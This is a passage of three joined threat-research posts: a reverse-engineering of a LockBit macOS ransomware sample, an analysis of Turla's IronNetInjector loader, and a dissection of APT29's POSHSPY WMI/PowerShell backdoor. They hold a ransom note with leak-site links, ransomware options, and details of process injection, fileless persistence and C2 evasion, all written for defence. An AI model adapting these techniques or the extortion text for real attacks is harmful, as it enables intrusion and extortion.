Clearly, nothing relating to macOS specifically …in fact more indications this code is simply a recompile of (pieces of?)
LockBit’s ransomware that targets Windows/Linux, and also VMware ESXi. 
The malware then initializes various global variables, either with hard-coded values, or from the decrypted configuration (now held in g_Config). 
For example, here we see it set the bdaemon variable to 0x1, or ’true’ …even though its already set to that value. 
_bdaemon: 0000000100059088 dd 0x00000001 ... 000000010000b174 adrp x9, #0x100059000 ... 000000010000b17c mov w8, #0x1 000000010000b180 nop 000000010000b184 str w8, [x9, #0x88] ; _bdaemon Here’s the list of global variables that are referenced …which based on their names, provide insight into the malware configuration options: 
iMinfilesize iSpotMaximum bdaemon bSelfRemove publickey idelayinmin wholefile bfullog bnostop noext no_log bwipe bVMDKmode …also, by manually manipulating these values in a debugger (or as we’ll see via the command line) we can simplify analysis.
For example, setting bdaemon to false will prevent the binary from daemonizing (making it easier to debug), while setting bfullog to true to coerce the malware to log its actions! 
The malware then de-XORs other strings, with the hard-coded key of 0x39 000000010000b260 ldr w8, =0x1964126200000039 Most of the strings are de-XOR’d in a function aptly named de_xor_all.
We could step through this and dump each string manually, or, as a hard-coded XOR key is used, simply de-XOR the entire binary and see what falls out: with open("locker_Apple_M1_64", "rb") as f_in, open("strings", "wb") as f_out: while True: chunk = f_in.read(1024) if not chunk: break encrypted_chunk = bytes(byte ^
0x39 for byte in chunk) 
f_out.write(encrypted_chunk) 
This produces strings including a commandline usage: Usage: %s
[OPTION]... -i
'/path/to/crypt' Recursively crypts files in a path or by extention. 
Mandatory arguments to long options are mandatory for short options too. 
-i, --indir path to crypt -m, --minfile minimal size of a crypted file, no less than 4096 -r, --remove self remove this file after work -l, --log prints the log to the console -n, --nolog do not print the log to the file /tmp/locker.log -d, --daemonize runs a program as Unix daemon -w, --wholefile encrypts whole file -b, --beginfile encrypts first N bytes -e, --extentions encrypts files by extentions -o, --nostop prevent to stop working VM -t, --wipe wipe free space -s, --spot upper bound limitation value of spot in Mb -p, --pass password -f, --full full log -a, --delay start delay in minutes -y, --noexts do not search for extentions -v, --vmdk search for extentions inside VMDK files Clearly these match to the global variables that apparently can be set via the command-line as well.
As we’ll set this makes analysis even easier! 
Also the de-XOR’d strings, we find the full ransom note (here, truncated): 
~~~ LockBit 3.0 the world's fastest and most stable ransomware from 2019~~~ >>>>>
Your data is stolen and encrypted. 
If you don't pay the ransom, the data will be published on our TOR darknet sites.
Keep in mind that once your data appears on our leak site, it could be bought by your competitors at any second, so don't hesitate for a long time.
The sooner you pay the ransom, the sooner your company will be safe. 
Tor Browser Links: http://lockbitapt2d73krlbewgv27tquljgxr33xbwwsp6rkyieto7u4ncead.onion http://lockbitapt2yfbt7lchxejug47kmqvqqxvvjpqkmevv4l3azl3gy6pyd.onion http://lockbitapt34kvrip6xojylohhxrwsvpzdffgs5z4pbbsywnzsbdguqd.onion http://lockbitapt5x4zkjbcqmz6frdhecqqgadevyiwqxukksspnlidyvd7qd.onion http://lockbitapt6vx57t3eeqjofwgcglmutr3a35nygvokja5uuccip4ykyd.onion http://lockbitapt72iw55njgnqpymggskg5yp75ry7rirtdg4m7i42artsbqd.onion http://lockbitaptawjl6udhpd323uehekiyatj6ftcxmkwe5sezs4fqgpjpid.onion http://lockbitaptbdiajqtplcrigzgdjprwugkkut63nbvy2d5r4w2agyekqd.onion http://lockbitaptc2iq4atewz2ise62q63wfktyrl4qtwuk5qax262kgtzjqd.onion Links for normal browser: http://lockbitapt2d73krlbewgv27tquljgxr33xbwwsp6rkyieto7u4ncead.onion.ly http://lockbitapt2yfbt7lchxejug47kmqvqqxvvjpqkmevv4l3azl3gy6pyd.onion.ly http://lockbitapt34kvrip6xojylohhxrwsvpzdffgs5z4pbbsywnzsbdguqd.onion.ly http://lockbitapt5x4zkjbcqmz6frdhecqqgadevyiwqxukksspnlidyvd7qd.onion.ly http://lockbitapt6vx57t3eeqjofwgcglmutr3a35nygvokja5uuccip4ykyd.onion.ly http://lockbitapt72iw55njgnqpymggskg5yp75ry7rirtdg4m7i42artsbqd.onion.ly http://lockbitaptawjl6udhpd323uehekiyatj6ftcxmkwe5sezs4fqgpjpid.onion.ly http://lockbitaptbdiajqtplcrigzgdjprwugkkut63nbvy2d5r4w2agyekqd.onion.ly http://lockbitaptc2iq4atewz2ise62q63wfktyrl4qtwuk5qax262kgtzjqd.onion.ly ... >>>>
Very important!
For those who have cyber insurance against ransomware attacks. 
Insurance companies require you to keep your insurance information secret, this is to never pay the maximum amount specified in the contract or to pay nothing at all, disrupting negotiations.
The insurance company will try to derail negotiations in any way they can so that they can later argue that you will be denied coverage because your insurance does not cover the ransom amount.
For example your company is insured for 10 million dollars, while negotiating with your insurance agent about the ransom he will offer us the lowest possible amount, for example 100 thousand dollars, we will refuse the paltry amount and ask for example the amount of 15 million dollars, the insurance agent will never offer us the top threshold of your insurance of 10 million dollars.
He will do anything to derail negotiations and refuse to pay us out completely and leave you alone with your problem.
If you told us anonymously that your company was insured for $10 million and other important details regarding insurance coverage, we >>>>>
If you do not pay the ransom, we will attack your company again in the future. 
Once the malware has de-XOR’d all its strings, it invokes a method named go.
This parses command-line options (updating global variables is relevant), and performs various other initializations, such as invoking a function named sodium_init (likely to initialize the commonly used Sodium crypto library).
Interestingly also, the malware invokes a function named get_password to read from stdin …it checks against the value of test 000000010000a618 bl imp___stubs__strcmp (lldb)
x/s $x0 0x16fdfeb10: "hunter2" (lldb) x/s $x1 0x10005a0d2: "test At this point, armed with an decent understanding of the malware (yah, its ransomware) plus understanding of commandline options (that also allow us to enable logging), coupled with the fact that it’s a Sunday (aka the day of rest, not reversing malware) I decided to switch to passive dynamic analysis.
Also, maybe you’re tired of reading arm64?
:grinning_face_with_sweat: 
My goal was now trigger the malware to encrypt (ransom) files, while passively observing it in action. 
On my dedicated analysis machine, I first created a directory for it to encrypt (~/Downloads/lock_me_up) which I filled with files to encrypt (for some reason, I thought it was be funny to put other malware samples in there for the ransomware to encrypt). 
Then I kicked off a file monitor, filtering on the locker_Apple_M1_64 process: # FileMonitor.app/Contents/MacOS/FileMonitor -pretty -json -filter locker_Apple_M1_64 ... 
Next, I ran the malware with the following command line: -f : full log -p pass : password -i ~/Downloads/lock_me_up : directory to encrypt / ransom First, the file monitoring detected the ransomware opening its log file (tmp/locklog).
We’ll take a peek at the log file’s contents shortly. 
# FileMonitor.app/Contents/MacOS/FileMonitor -pretty -json -filter locker_Apple_M1_64 ... { "event" : "ES_EVENT_TYPE_NOTIFY_OPEN", "file" : { "destination" : "/private/tmp/locklog", "process" : { ... "pid" : 8231 "name" : "locker_Apple_M1_64", "path" : "/Users/user/Downloads/locker_Apple_M1_64", ... } } } Then, accessing (opening) the files in the specified directory, to encrypt them, and renaming the encrypted files with the .lockbit extension: # FileMonitor.app/Contents/MacOS/FileMonitor -pretty -json -filter locker_Apple_M1_64 ... { "event" : "ES_EVENT_TYPE_NOTIFY_OPEN", "file" : { "destination" : "/Users/user/Downloads/lock_me_up/DazzleSpy.zip", "process" : { ... "pid" : 8231 "name" : "locker_Apple_M1_64", "path" : "/Users/user/Downloads/locker_Apple_M1_64", ... } } }, { "event" : "ES_EVENT_TYPE_NOTIFY_RENAME", "file" : { "destination" : "/Users/user/Downloads/lock_me_up/DazzleSpy.zip.lockbit", "process" : { ... "pid" : 8231 "name" : "locker_Apple_M1_64", "path" : "/Users/user/Downloads/locker_Apple_M1_64", ... } } } Finally, it creates a file named "!!!
-Restore-My-Files-!!!"
which is ransom note with the decryption instructions: # FileMonitor.app/Contents/MacOS/FileMonitor -pretty -json -filter locker_Apple_M1_64 ... { "event" : "ES_EVENT_TYPE_NOTIFY_CREATE", "file" : { "destination" : "/Users/user/Downloads/lock_me_up/!!!-Restore-My-Files-!!!
", "process" : { ... "pid" : 8231 "name" : "locker_Apple_M1_64", "path" : "/Users/user/Downloads/locker_Apple_M1_64", ... } } } Ransomed files and ransom note Let’s take a peek at the log (/tmp/locker.log), which gives us details in the ransomware’s actions: [19:16:45][74073472l][+] Launch parameters: ./locker_Apple_M1_64
-i '/Users/user/Downloads/lock_me_up' -m 16 -w 0 -b 0 -r 0 -l 1 -n 0 -d 1 -e '' -s 10 -p test -o 0
-t 0 -f 1
-a
0
-z
-y 0 ~~~~~~~~~~~~~~~Hardware~~~~~~~~~~~~~~~~~~ [19:32:07][4329948544][+] Add directory to encrypt: /Users/user/Downloads/lock_me_up 
[19:32:07][6140964864][+] Start encrypting file /Users/user/Downloads/lock_me_up/DazzleSpy.zip 
[19:32:07][6140964864][+] Start encrypting file /Users/user/Downloads/lock_me_up/DazzleSpy.zip spot 0 from 1.
Original checksum 2846984875 ... 
[19:32:07][6140964864][+] End file /Users/user/Downloads/lock_me_up/DazzleSpy.zip size 223464 time 1672883981 is encrypted.
Checksum after encryption 3269819564 ... 
At this point, we have a fairly comprehensive analysis of the malware, and have confirmed it is (as wholly expected) ransomware.
And, being able to trigger its ransomware logic is helpful to testing detection tools (discussed next). 
Detection Of course its goes without saying, having your files ransomed sucks!
And good news, in this case the average macOS is unlikely to be impacted by this LockBit macOS sample.
Still the fact that a large ransomware gang has apparently set its sights on macOS, should give us pause for concern and also talk about preventing this (and future) samples in the first place. 
First, Apple has been fairly proactive about mitigating ransomware attacks on macOS (and maybe this is why we’ve yet seen a major ransomware outbreak on macOS).
So, kudos to Cupertino.
Specifically Apple has implemented SIP (and now read-only volumes) to protect OS-level files.
This means even if ransomware finds its way onto a macOS system it won’t (easily) be able to mess with core OS files.
Apple has also added (TCC) protections to user files founds in (now) protected directories such as ~/Desktop, ~/Documents, etc. etc.
This means, that without an exploit or user-approval users files will remain protected. 
Still an additional layer or detection/protection may be warranted, especially we’ve all probably clicked “Allow” on access prompts, while even Apple has been known to notarize malware. 
If we stop to think specifically about ransomware, in theory, (at least in most cases) it should be trivial to detect.
Why?
Simply put, ransomware’s actions provide us with a powerful detection heuristic. 
In April 2016 (yes, wayyyy back then!)
I posted a blog titled, “Towards Generic Ransomware Detection”.
In this post, I mused, “If we can monitor file I/O events and detect the rapid creation of encrypted files by untrusted processes, then ransomware may be generically detected” To back this up, I released a free (and now open-source) tool called “RansomWhere?” that implemented this heuristic-based approach.
Specifically it process file
I/O events and for newly created files asks: Is the process creating file untrusted (e.g. not an Apple platform binary)? 
Is created file encrypted? 
Is the (untrusted) process rapidly creating several encrypted files? 
If these are all true, “RansomWhere?” will suspend process as its likely ransomware and alert the user and handle the response (resume/terminate). 
As with any detection approach and security tool, there are limitations.
I've been clear to articulate these in "RansomWhere?"'s tool page: RansomWhere?'s Limitations Most notably, “RansomWhere?” is slightly reactive, meaning several files maybe be encrypted (and thus ransomed) before the tool detects and blocks the ransomware. 
And though “RansomWhere?” is a bit dated, it appears to be able to generically detect this LockBit sample …even though it had no a priori knowledge of this malware: RansomWhere?
...doing it's thing! 
Conclusion Today we dove into a macOS ransomware sample created by the infamous LockBit ransomware gang.
And while this may be the first time a large ransomware group created ransomware capable of running on macOS, it worth nothing that this sample is far from ready for prime time.
From it’s lack of a valid code-signing signature to its ignorance of TCC and other macOS file-system protections as it stands it poses no threat to macOS users. 
Moreover, the variant is rather buggy …containing flaws such as buffer overflows that will cause it to prematurely exit, when run on macOS: The likely explanation to all this, is that the specimen we looked at today is test (or beta): “Cisco Talos researcher Azim Khodjibaev told BleepingComputer that based on their research, the encryptors were meant as a test and were never intended for deployment in live cyberattacks.” 
…still, as we stated earlier, the fact that a large ransomware gang (LockBit) has apparently set its sights on macOS, should give us all pause for concern.
And, if nothing else, make sure we’re adequately prepared for future attacks that likely will be more polished and thus pose a greater risk. 
Interested in Mac Malware Analysis Techniques? 
title: IronNetInjector: Turla’s New Malware Loading Tool url: https://unit42.paloaltonetworks.com/ironnetinjector/ This post is also available in: 日本語 (Japanese)Executive Summary In recent years, more and more ready-made malware is released on software development hosting sites available for everybody to use – including threat actors.
This not only saves the bad guys development time, but also makes it much easier for them to find new ideas to prevent detection of their malware. 
Unit 42 researchers have found several malicious IronPython scripts whose purpose is to load and run Turla’s malware tools on a victim’s system.
The use of IronPython for malicious purposes isn’t new, but the way Turla uses it is new.
The overall method is known as Bring Your Own Interpreter (BYOI).
It describes the use of an interpreter, not present on a system by default, to run malicious code of an interpreted programming or scripting language. 
The first malicious IronPython scripts of the tool we describe here were discovered last year by a security researcher from FireEye.
At the beginning of this year, another security researcher from Dragos pointed out some new scripts of the same threat actor uploaded to VirusTotal from two different submitters.
We found that one of the submitters also uploaded two other samples, which are most likely embedded payloads of one of the IronPython scripts.
These samples helped us to understand how this tool works, what malware it loads and which threat actor uses it. 
While the IronPython scripts are only the first part of the tool, the main task of loading malware is done by an embedded process injector.
We dubbed this toolchain IronNetInjector, the blend of IronPython and the injector’s internal project name NetInjector.
In this blog, we describe the IronPython scripts and how they’re used to load one or more payloads with the help of an injector. 
Palo Alto Networks customers are protected from this threat through WildFire and Cortex XDR.
AutoFocus customers can investigate this activity with the tag “IronNetInjector”. 
What Is IronPython? 
First, let’s take a look at what IronPython is and why it was chosen as a loading vector.
In the words of the IronPython team: IronPython is an open-source implementation of the Python programming language which is tightly integrated with the .NET Framework.
IronPython can use the .NET Framework and Python libraries, and other
.NET languages can use Python code just as easily. 
And further: IronPython’s sweet-spot is being able to use the .NET framework APIs directly from Python. 
With IronPython, you can use .NET framework APIs directly in your Python script.
It is a Python interpreter written entirely in C#.
Currently, it fully supports Python 2, while support for Python 3 is still in development.
As one of two official projects formerly developed by Microsoft, the other being IronRuby, it uses the Dynamic Language Runtime (DLR). 
Now, it becomes clear why IronPython is also attractive for malware authors.
You can make use of the .NET framework APIs without having to compile a .NET assembly.
Of course, this requires the IronPython interpreter to also be present on the system, but that can be accomplished in different ways.
Also, IronPython scripts don’t run with the original Python interpreter when .NET framework APIs are used in the code.
In case of a sandbox that supports Python scripts, the interpreter would simply crash without any dynamic analysis result.
Further, as IronPython is written in C# and thus its process contains all the Common Language Runtime (CLR) on execution, one can easily load additional assemblies. 
IronNetInjector IronNetInjector is made of an IronPython script that contains a .NET injector and one or more payloads.
The payloads can be also .NET assemblies (x86/64) or native PEs (x86/64).
When an IronPython script is run, the .NET injector gets loaded, which in turn injects the payload(s) into its own or a remote process. 
The key features of the malicious IronPython scripts are as follows: Function and variable names are obfuscated. 
Strings are encrypted. 
Contain an encrypted .NET injector and one or more encrypted PE payloads. 
Take one argument that is the decryption key for the embedded .NET injector and PE payload(s). 
Embedded .NET injector and payload(s) are encoded with Base64 and encrypted with Rijndael. 
Log messages are written to %PUBLIC%\Metadata.dat Error messages are written to %PUBLIC%\Metaclass.dat 
The following screenshot shows one of the IronPython scripts decoded: Figure 1.
Decoded IronPython script with embedded .NET injector and ComRAT payload (both shortened).We have found two versions of the .NET injector, a newer variant internally named NetInjector compiled in 2019 and an earlier variant named PeInjector_x64 compiled in 2018.
The earlier variant is much more limited in functionality compared to the 2019 variant. 
Both versions are full-blown PE injection tools able to load a native x86/64 payload reflectively into a remote process.
This is accomplished via unmanaged functions and the use of PeNet, a publicly available PE parser library written in C#.
The decompiled code is self-explanatory as meaningful function, method and variable names are used throughout the code.
Additionally, log and error messages are being used extensively. 
The 2018 variant is used within PowerShell scripts to load a payload from the same script into a process.
Most of its code is taken from PowerShell Empire’s ReflectivePEInjection script and got translated into C#.
It’s written in a much more specific manner than the 2019 variant, which is a generically written injection tool.
The newer version additionally contains the ability to inject .NET assemblies into unmanaged processes.
Also, it can load payloads into its own process space, the IronPython interpreter process. 
The newer injector has the following PDB path left: C:\Users\Devel\source\repos\c4\agent\build_tools\agent_dll_to_Python_loader\NetInjector\NetInjector\obj\Release\NetInjector.pdb The same submitters who uploaded the IronPython scripts also submitted other files which are directly related to IronNetInjector.
Based on the file sizes and the file sizes of the embedded payloads in the IronPython scripts, we can make some assumptions about what the payloads likely are. 
The following table shows the IronPython scripts categorized by the different VirusTotal submitters.
It also shows which other samples uploaded by the same submitter or the other submitters are connected and gives the assumed embedded malware: Submitter IronPython script(s) uploads Related samples uploaded by same submitter Payload assumptions 1 • prophile.py • profilec.py • IronPython-2.7.7z: Portable IronPython version that contains the two IronPython scripts and a Windows task XML to start profilec.py • prophile.py: .NET injector (variant 2018)
+ RPC backdoor variant • profilec.py: .NET injector (variant 2019)
+
ComRAT variant 2 • profile.py – • profile.py: .NET injector (variant 2019)
ComRAT variant 3 • 10profilec.py • 120profilec.py • 220profile.py – • 10profilec.py: .NET injector (variant 2018)
ComRAT variant • 120profilec.py: .NET injector (variant 2019)
ComRAT variant • 220profile.py: .NET injector (variant 2018)
Unknown 4 • profilec.py • NetInjector.dll: .NET injector (variant 2019), most likely embedded .NET
injector in profilec.py of same submitter • payload.exe: ComRAT v4 variant (DLL), most likely embedded in profilec.py of same submitter – 5 – • part_1.data: .NET injector (variant 2018), most likely embedded in prophile.py of submitter 1 • part_2.data: RPC backdoor variant, most likely embedded in prophile.py of submitter 1 • part_3.data: RPC backdoor variant, most likely embedded in prophile.py of submitter 1 – Table 1.
Categorized IronPython samples according to VirusTotal submitters and their assumed payloads. 
It becomes clear that IronNetInjector is mostly used to load ComRAT.
In one case, a variant of the RPC backdoor is used and in another a payload that we couldn’t associate with known malware. 
We also couldn’t verify how the IronPython scripts get run in the first place.
One of the submitters uploaded a 7-Zip archive with the contents of the IronPython MSI file of version 2.7.0.40 from 2011.
This archive also contains two IronPython scripts (see table) and a Windows task XML file named mssch.xml with the following content: Figure 2.
Windows task XML file for IronNetInjector.
The task is used to start an IronPython script with the 64-bit version of the interpreter.
As a command line argument, the Rijndael decryption key is passed.
However, the key didn’t decrypt on any of the embedded files in the scripts we found.
The task’s description is PythonUpdateSrvc and it runs either on Windows startup when a user logs in or when one of two system events get created: Figure 3.
IronNetInjector task triggers.
Depending on the system, the event with ID 8001 belongs to Microsoft Internet Information Services (IIS), Microsoft Exchange Server or Windows Server (Source: Netsurion EventTracker).
The other event with ID 5324 is likely related to the logoff from Winlogon.
Both triggers only happen when these events appear in the Microsoft-Windows-GroupPolicy(/Operational) event logs. 
When we consider that the files in the 7-Zip archive were all taken from the same directory, we can make some assumptions.
The attacker might have used the IronPython MSI to install the interpreter to C:\ProgramData\IronPython-2.7 on the victim’s system.
The IronPython scripts and the Windows task XML were placed in the same directory.
The task file is then used to create a task which in turn starts a script when triggered.
However, it’s also possible that the submitter collected the files from different places and just bundled them into an archive for scanning purposes.
It’s also unclear why the attacker would use such an old version of IronPython. 
A Brief Walkthrough Let’s go briefly through the execution flow based on one of the scripts of VirusTotal submitter 4 that contains the 2019 variant of the injector and a ComRAT variant (SHA256: 3aa37559ef282ee3ee67c4a61ce4786e38d5bbe19bdcbeae0ef504d79be752b6). 
When an IronPython script is run, it is loaded into the IronPython interpreter.
In the IronPython script, the embedded .NET injector (SHA256: a56f69726a237455bac4c9ac7a20398ba1f50d2895e5b0a8ac7f1cdb288c32cc) and ComRAT DLL payload (SHA256: a62e1a866bc248398b6abe48fdb44f482f91d19ccd52d9447cda9bc074617d56) get decoded and decrypted.
This is done with the Python Base64 module and the RijndaelManaged class from the C# cryptography namespace.
The decryption key is passed as an argument to the IronPython script.
The Rijndael initialization vector (IV) is stored in the script.
Next, the .NET injector gets loaded into the IronPython process with the help of the Assembly.
Load() method of the C# Reflection namespace.
That’s possible because IronPython itself is a .NET assembly and thus its process already contains all the .NET runtime libraries. 
After the injector assembly is loaded, the ID of the process where the ComRAT DLL gets injected is retrieved.
In this case, the explorer.exe was chosen.
This routine to get the PID slightly differs in the IronPython scripts we found.
While one script uses the C# method GetProcessesByName() to get the PID, the other scripts run the Windows tool tasklist.exe with the help of the Python os.popen() function.
The output is then parsed to the targeted process ID with the help of tasklist filters.
Also, some scripts filter the PID based on a Windows service name.
When the PID is found, an instance of the injector assembly is created and the ComRAT payload bytes and PID are passed. 
Figure 4.
PID retrieval function variations in the different IronPython scripts.
Finally, the injector’s public methods Invoke() and InvokeVoid() get called.
In the latter, the exported function name VFEP of the ComRAT payload gets passed.
From this point on, the .NET injector takes control over the further execution. 
The .NET injector contains the following namespaces: DefaultSerializer PeNet PeNet.
Parser PeNet.
Structures PeNet.
Structures.
MetaDataTables PeNet.
MetaDataTables.
Parsers PeNet.
Utilities While the PeNet code is copied from the project, the namespace DefaultSerializer contains the injector code and is made of the following classes: DefaultSerializer: Contains the injector code. 
NetBootstrapper:
Contains 32-/64-bit bootstrappers to load an assembly into an unmanaged process. 
Win32:
Contains the imported unmanaged function declarations and win32 structures/constants. 
The DefaultSerializer class exposes four public methods: InjectAssembly Invoke InvokeAssemblyMethod InvokeVoid These methods are used pairwise.
The method InjectAssembly is used to inject a .NET assembly into a native process (or its own) and InvokeAssemblyMethod to call any chosen method of the injected assembly.
The method Invoke is used to inject a native PE into a remote process and InvokeVoid to call any exported function of the injected payload. 
Figure 5.
Decompiled NetInjector code.
Depending on the number of arguments passed to DefaultSerializer on creation time, the payload is either loaded into its own process or a remote one.
In case only the payload bytes are passed, it gets loaded into its own process space.
The other options are to also pass the ID or handle of the remote process the payload gets injected to. 
In our case, the second option is used with the PID of explorer.exe to load the ComRAT payload reflectively into the process. 
One other interesting aspect of the injector is its ability to load an assembly into an unmanaged process.
This needs some preparation in the remote process, as you cannot simply load and execute a .NET assembly there if the CLR isn’t present.
This is accomplished with a native bootstrapper DLL, which gets injected into the remote process and prepares it so a .NET assembly can be injected afterwards. 
There are two bootstrappers (x86/64) contained in the NetBootstrapper class, which have the following PDB paths left: F:\Dev\NetInjector\bin\Release\NetBootstrapper_Win32.pdb F:\Dev\NetInjector\bin\Release\NetBootstrapper_x64.pdb Just like the injector itself, the bootstrappers contain meaningful function names (exported functions) and useful log messages.
It uses the following exported functions: 
Bootstrap: Load CLR services into process. 
GetMethodResult:
Get method result from InvokeMethod. 
InvokeMethod: Call method of injected assembly passed as a parameter. 
LoadAssembly: Load .NET assembly passed as a parameter. 
StartClrRuntime:
Same as Bootstrap. 
These functions are called from the injector to prepare and load a .NET assembly payload from the IronPython script into a remote process. 
In all the IronPython scripts we found, only the native payload to native remote process injection option is used. 
Conclusion IronNetInjector is another toolset in Turla’s ever-growing arsenal, made of an IronPython script and an injector.
It’s similar in structure to the previously used in-memory loading mechanism to execute malware with the help of PowerShell scripts.
These scripts contain an embedded PE loader to execute an embedded malware payload. 
The tool we discussed in this blogpost was likely developed to move away from PowerShell towards .NET.
This general trend can be seen in recent years as detection of Powershell based threats became better, but also due to security mechanisms like AMSI introduced by Microsoft. 
The .NET injectors and bootstrappers contain clean code and meaningful function/method/variable names, and they use detailed log/error messages.
Only the initial IronPython scripts are obfuscated to prevent easy detection. 
There are still some questions we need answers for, such as what other samples get loaded beside ComRAT and the RPC backdoor?
How do the IronPython scripts get run?
And how is the interpreter deployed to a victim’s system? 
We will continue to monitor for this malware loading tool to get the missing pieces of the puzzle. 
Palo Alto Networks customers are protected from this malware tool.
Our threat prevention platform WildFire detects it as malicious.
Our extended detection and response platform Cortex XDR can identify and block the malware execution.
AutoFocus customers can track the activity with the tag “IronNetInjector”. 
Indicators of Compromise IronPython scripts b641687696b66e6e820618acc4765162298ba3e9106df4ef44b2218086ce8040 (prophile.py, submitter 1) c430ebab4bf827303bc4ad95d40eecc7988bdc17cc139c8f88466bc536755d4e (profilec.py, submitter 1) c1b8ecce81cf4ff45d9032dc554efdc7a1ab776a2d24fdb34d1ffce15ef61aad (profile.py, submitter 2) 8df0c705da0eab20ba977b608f5a19536e53e89b14e4a7863b7fd534bd75fd72 (10profilec.py, submitter 3) b5b4d06e1668d11114b99dbd267cde784d33a3f546993d09ede8b9394d90ebb3 (120profilec.py, submitter 3) b095fd3bd3ed8be178dafe47fc00c5821ea31d3f67d658910610a06a1252f47d (220profile.py, submitter 3) 3aa37559ef282ee3ee67c4a61ce4786e38d5bbe19bdcbeae0ef504d79be752b6 (profilec.py, submitter 4) Injector samples a56f69726a237455bac4c9ac7a20398ba1f50d2895e5b0a8ac7f1cdb288c32cc (2019 variant, submitter 4) c59fadeb8f58bbdbd73d9a2ac0d889d1a0a06295f1b914c0bd5617cfb1a08ce9 (2018 variant, submitter 5) Bootstrapper samples 63d7695dabefb97aa30cbe522647c95395b44321e1a3b08b8028e4000d1be15e ba17af72a9d90822eed447b8526fb68963f0cde78df07c16902dc5a0c44536c4 Related samples 82333533f7f7cb4123bceee76358b36d4110e03c2219b80dced5a4d63424cc93 (IronPython-2.7.7z, submitter 1) a62e1a866bc248398b6abe48fdb44f482f91d19ccd52d9447cda9bc074617d56 (ComRAT v4 variant, submitter 4) 18c173433daafcc3aea17fc4f7792d0ff235f4075a00feda88aa1c9f8f6e1746 (RPC backdoor variant, submitter 5) a64e79a81b5089084ff88e3f4130e9d5fa75e732a1d310a1ae8de767cbbab061 (RPC backdoor variant, submitter 5) Get updates from Palo Alto Networks! Sign up to receive the latest news, cyber threat intelligence and research from us 
title: Dissecting One of APT29’s Fileless WMI and PowerShell Backdoors (POSHSPY) url: https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html Mandiant has observed APT29 using a stealthy backdoor that we call POSHSPY.
POSHSPY leverages two of the tools the group frequently uses: PowerShell and Windows Management Instrumentation (WMI).
In the investigations Mandiant has conducted, it appeared that APT29 deployed POSHSPY as a secondary backdoor for use if they lost access to their primary backdoors. 
POSHSPY makes the most of using built-in Windows features – so-called “living off the land” – to make an especially stealthy backdoor.
POSHSPY's use of WMI to both store and persist the backdoor code makes it nearly invisible to anyone not familiar with the intricacies of WMI.
Its use of a PowerShell payload means that only legitimate system processes are utilized and that the malicious code execution can only be identified through enhanced logging or in memory.
The backdoor's infrequent beaconing, traffic obfuscation, extensive encryption and use of geographically local, legitimate websites for command and control (C2) make identification of its network traffic difficult.
Every aspect of POSHSPY is efficient and covert. 
Mandiant initially identified an early variant of the POSHSPY backdoor deployed as PowerShell scripts during an incident response engagement in 2015.
Later in that same engagement, the attacker updated the deployment of the backdoor to use WMI for storage and persistence.
Mandiant has since identified POSHSPY in several other environments compromised by APT29 over the past two years. 
We first discussed APT29’s use of this backdoor as part of our “No Easy Breach” talk.
For additional details on how we first identified this backdoor, and the epic investigation it was part of, see the slides and presentation. 
Windows Management Instrumentation WMI is an administrative framework that is built into every version of Windows since 2000.
WMI provides many administrative capabilities on local and remote systems, including querying system information, starting and stopping processes, and setting conditional triggers.
WMI can be accessed using a variety of tools, including the Windows WMI Command-line (wmic.exe), or through APIs accessible to programming and scripting languages such as PowerShell.
Windows system WMI data is stored in the WMI common information model (CIM) repository, which consists of several files in the System32\wbem\Repository directory. 
WMI classes are the primary structure within WMI.
WMI classes can contain methods (code) and properties (data).
Users with sufficient system-level privileges can define custom classes or extend the functionality of the many default classes. 
WMI permanent event subscriptions can be used to trigger actions when specified conditions are met.
Attackers often use this functionality to persist the execution of backdoors at system start up.
Subscriptions consist of three core WMI classes: a Filter, a Consumer, and a FilterToConsumerBinding.
WMI Consumers specify an action to be performed, including executing a command, running a script, adding an entry to a log, or sending an email.
WMI Filters define conditions that will trigger a Consumer, including system startup, the execution of a program, the passing of a specified time and many others.
A FilterToConsumerBinding associates Consumers to Filters.
Creating a WMI permanent event subscription requires administrative privileges on a system. 
We have observed APT29 use WMI to persist a backdoor and also store the PowerShell backdoor code.
To store the code, APT29 created a new WMI class and added a text property to it in order to store a string value.
APT29 wrote the encrypted and base64-encoded PowerShell backdoor code into that property. 
APT29 then created a WMI event subscription in order to execute the backdoor.
The subscription was configured to run a PowerShell command that read, decrypted, and executed the backdoor code directly from the new WMI property.
This allowed them to install a persistent backdoor without leaving any artifacts on the system’s hard drive, outside of the WMI repository.
This “fileless” backdoor methodology made the identification of the backdoor much more difficult using standard host analysis techniques. 
POSHSPY WMI Component The WMI component of the POSHSPY backdoor leverages a Filter to execute the PowerShell component of the backdoor on a regular basis. 
In one instance, APT29 created a Filter named BfeOnServiceStartTypeChange (Figure 1), which they configured to execute every Monday, Tuesday, Thursday, Friday, and Saturday at 11:33 am local time. 
Figure 1: “BfeOnServiceStartTypeChange” WMI Query Language (WQL) filter condition 
The BfeOnServiceStartTypeChange Filter was bound to the CommandLineEventConsumer WindowsParentalControlsMigration.
The WindowsParentalControlsMigration consumer was configured to silently execute a base64-encoded PowerShell command. 
Upon execution, this command extracted, decrypted, and executed the PowerShell backdoor payload stored in the HiveUploadTask text property of the RacTask class.
The PowerShell command contained the payload storage location and encryption keys.
Figure 2 displays the command, called the “CommandLineTemplate”, executed by the WindowsParentalControlsMigration consumer. 
Figure 2: WindowsParentalControlsMigration
CommandLineTemplate Figure 3 contains the decoded PowerShell command from the “CommandLineTemplate.” Figure 3: Decoded CommandLineTemplate PowerShell code POSHSPY PowerShell Component The full code for a POSHSPY sample is available here. 
The POSHSPY backdoor is designed to download and execute additional PowerShell code and Windows binaries.
The backdoor contains several notable capabilities, including: 1.
Downloading and executing PowerShell code as an EncodedCommand 2.
Writing executables to a randomly-selected directory under Program Files, and naming the EXE to match the chosen directory name, or, if that fails, writing the executable to a system-generated temporary file name, using the EXE extension 3.
Modifying the Standard Information timestamps (created, modified, accessed) of every downloaded executable to match a randomly selected file from the System32 directory that was created prior to 2013 4.
Encrypting communications using AES and RSA public key cryptography 5.
Deriving C2 URLs from a Domain Generation Algorithm (DGA) using lists of domain names, subdomains, top-level domains (TLDs), Uniform Resource Identifiers (URIs), file names, and file extensions 6.
Using a custom User Agent string or the system's User Agent string derived from urlmon.dll 7.
Using either custom cookie names and values or randomly-generated cookie names and values for each network connection 8.
Uploading data in 2048-byte chunks 9.
Appending a file signature header to all encrypted data, prior to upload or download, by randomly selecting from the file types: ICO GIF JPG PNG MP3 BMP The sample in this example used 11 legitimate domains owned by an organization located near the victim.
When combined with the other options in the DGA, 550 unique C2 URLs could be generated.
